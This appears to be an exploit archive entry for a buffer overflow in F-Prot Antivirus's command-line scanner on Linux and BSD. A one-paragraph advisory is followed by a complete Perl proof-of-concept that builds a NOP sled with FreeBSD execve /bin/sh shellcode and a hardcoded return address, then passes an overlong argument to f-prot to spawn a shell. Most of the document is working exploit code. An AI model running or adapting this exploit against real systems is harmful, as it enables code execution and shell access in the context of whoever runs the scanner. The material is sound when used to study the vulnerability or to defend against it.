source: http://www.securityfocus.com/bid/6969/info

Frisk's F-Prot Antivirus for Linux and BSD is prone to a buffer overflow in file name parameters that are passed to the command line scanner. If a backup script is launched by a privileged user to scan the filesystem scans a file with an unusually long name, arbitrary code could potentially execute on the system in the security context of the script's owner. 

#!/usr/bin/perl
# knud
$len = 1000;
$ret = 0xbfbffb7f; # on my 4.7-RELEASE
$nop = "\x90";
$offset = 0;
$shellcode ="\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56". #freebsd 29bytes
            "\xb0\x3b\x50\xcd\x80\xe8\xed\xff\xff\xff\x2f". #execve /bin/sh 
            "\x62\x69\x6e\x2f\x73\x68\x23";                 #zillionATsafemode.org

if (@ARGV == 1) {
    $offset = $ARGV[0];
}
for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {
    $buffer .= $nop;
}
$buffer .= $shellcode;
print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");
$new_ret = pack('l', ($ret + $offset));
for ($i += length($shellcode); $i < $len; $i += 4) {
    $buffer .= $new_ret;
}
local($ENV{'EGG'}) = $buffer; 
$cakeman = "ABC" . $new_ret x 247 ; 
exec("f-prot $cakeman");</PRE></BODY></HTML>